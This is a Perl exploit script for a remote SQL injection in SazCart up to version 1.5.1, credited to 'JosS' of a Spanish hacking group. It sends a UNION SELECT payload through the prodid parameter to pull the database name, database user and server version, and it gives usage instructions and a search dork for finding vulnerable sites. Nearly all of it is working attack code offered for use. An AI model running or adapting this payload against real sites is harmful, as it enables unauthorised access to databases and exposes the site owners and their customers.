#!/usr/bin/perl

# SazCart <= v1.5.1 (details&prodid) Remote SQL Injection Exploit
# HomePage: http://www.sazcart.com
# Discovered & Coded by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team / Sys - Project / EspSeC
# http://www.spanish-hackers.com
# rgod forever :D

# Dork: "Powered by SazCart"


print 
"\t\t########################################################\n\n";
print "\t\t#   SazCart <= v1.5.1 - Remote SQL Injection Exploit   
#\n\n";
print "\t\t#                       by JosS                        
#\n\n";
print 
"\t\t########################################################\n\n";

use strict;
use LWP::UserAgent;

my $victim = $ARGV[0];

if(!$ARGV[0]) {
   print "\n[x] SazCart <= v1.5.1 - Remote SQL Injection Exploit\n";
   print "[x] written by JosS - sys-project[at]hotmail.com\n";
   print "[x] usage: perl xpl.pl [host]\n";
   print "[x] example: http://localhost/path/\n\n";
   exit(1);
}

   print "\n[+] Exploiting...\n";
   my $cnx = LWP::UserAgent->new() or die;
   my 
$go=$cnx->get($victim."?details&prodid=1'+union+all+select+0,1,convert(concat(database(),char(58),user(),char(58),version()),char),3,4/*");
   if ($go->content =~ m/Price<\/b>\:(.*?)\<br/ms)
{
       print "[+] $1\n\n";
   } else {
       print "\n[-] exploit failed\n";
   } 